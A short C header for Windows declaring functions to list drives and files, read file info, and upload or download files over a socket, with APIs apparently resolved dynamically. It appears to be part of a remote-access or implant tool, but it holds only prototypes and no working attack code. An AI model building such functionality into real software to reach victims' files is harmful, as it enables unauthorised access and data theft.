#pragma once
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <direct.h>
#include <sys/stat.h>
#include "resolve_apis.h"

#define BUFFER_SIZE 4096

// Define the maximum number of drives that we can handle
#define MAX_DRIVES 26

extern API Api;

int get_object_info(char* path, struct stat* fileinfo);
int get_drives_list(char* buf);
char* get_file_list(const char* dirPath, int* numFiles);
int download_file(FILE* fp, SOCKET sock);
void upload_file(SOCKET sock, const char* path);